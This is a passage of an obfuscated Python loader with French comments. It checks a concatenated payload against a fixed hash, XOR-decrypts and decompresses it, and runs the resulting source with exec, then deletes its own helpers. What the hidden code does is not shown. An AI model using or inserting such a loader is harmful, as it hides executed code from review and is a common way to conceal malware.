_cssJ08mIwWLeEI + _crNRQu3ugbTZ_q + _cm9T6cGqL0I10r + _cfSeS9GA14K8zO + _cx8W1M4rikaCDD + _ceNZC7Ie32EC7D + _cvgUvrNcNcqMve + _cvoPtWIy7cLNK9 + _cpopb0LufvGYtj + _cm7aIJ80l0hFG9 + _crCf8g6VghvNO_ + _cr5XXi4Q64YuCz + _cylyIPCwCzWp2q + _cylrVzbVo06Y5A + _cdkrZkco1FJxKy + _cn7dRRm95GjqUB + _cyZArJbk4IkCiJ + _cbQs3fQoi01Evw + _cio886HeLVwsgz + _cgFMNUbH2HQRRZ + _ck5pRA1C45ONBp + _cqHoqeMIq7msPp + _cp6vav7AW0J_UO + _cmuKAOZG85hC6G + _cycBEvESFPe8CK + _cjWMUxNzscvqLE + _c_uyFLfaXFbPfW + _crGIEEkCA0yDXc + _cgreVUc6EzQByn + _cyUu8WB1pGNk7O + _cyiVeo5wJL94yP + _cnkT1cSNwgQXnJ + _cc_UeO6LaMXreT + _cyuE7iBlvJu1yX + _caPdp19GKOAHVl + _ctVs2tCL5w8V0K + _claiYa7nrFmnIV + _caW0dXv6PTqQTq + _cpIaO4m2lO75ge + _czKlmQWzSctbOT + _czw_OdElSaF0Dq + _colbrM17OXHP9X + _cry1OLjWtNJHd1 + _cbOAmzJzFGpjGv + _cdaxm2j3ZjZlUW + _chk4InquN71ZUk + _czZQfe2cCPwagq + _coSf5iAqFq81W0 + _cqtHI3j_bT0R0A)
if __import__('hashlib').sha256(_pnTyJWWXMj4Pdy).hexdigest() != '7549ac1dfba1922eeed40d98ccf62985cac1f808645fdbb87271cc05f7f1b47a':
    __import__('sys').exit(1)
_xeRfcwBauSvq74 = bytes([135, 248, 139, 25, 61, 144, 159, 230, 3, 141, 93, 72, 47, 18, 154, 138, 34, 100, 39, 190, 213, 102, 206, 240, 204, 152, 244, 10, 5, 73])
_fkem4YNo0h9URyJ = bytes([61, 213, 167, 149, 230, 22, 191, 176, 227, 71, 68, 100, 74, 108, 89, 3, 207, 205, 83, 99, 61, 55, 152, 117, 239, 225, 143, 141, 177, 253])

def _fxdEfu_Qxk5A_qO(_bnmbdXaU1SnKgu, _klyp9UIS39p7I7):
    return bytes(_bnmbdXaU1SnKgu[_ih5VPGB9HWVAnc] ^ _klyp9UIS39p7I7[_ih5VPGB9HWVAnc % len(_klyp9UIS39p7I7)] for _ih5VPGB9HWVAnc in range(len(_bnmbdXaU1SnKgu)))

def _fdqqfEqqU0OfnBE(_tn6iJTTmN__Iiy):
    import zlib
    return zlib.decompress(_tn6iJTTmN__Iiy) # Un seul niveau de zlib ici pour simplifier

def _fef6xhnkzRYx1Gq():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xhgS2FalWOQWGH = _fxdEfu_Qxk5A_qO(_pnTyJWWXMj4Pdy, _xeRfcwBauSvq74)
    # 2. Décompression Zlib
    _dovcBrXhB7LGNd = _fdqqfEqqU0OfnBE(_xhgS2FalWOQWGH)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dovcBrXhB7LGNd.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nnF8wMhkxIilAh = _main.__dict__
    _nnF8wMhkxIilAh.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nnF8wMhkxIilAh)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fef6xhnkzRYx1Gq()
try:
    del _fxdEfu_Qxk5A_qO, _fdqqfEqqU0OfnBE, _fef6xhnkzRYx1Gq
    del _pnTyJWWXMj4Pdy, _xeRfcwBauSvq74, _fkem4YNo0h9URyJ
except:
    pass
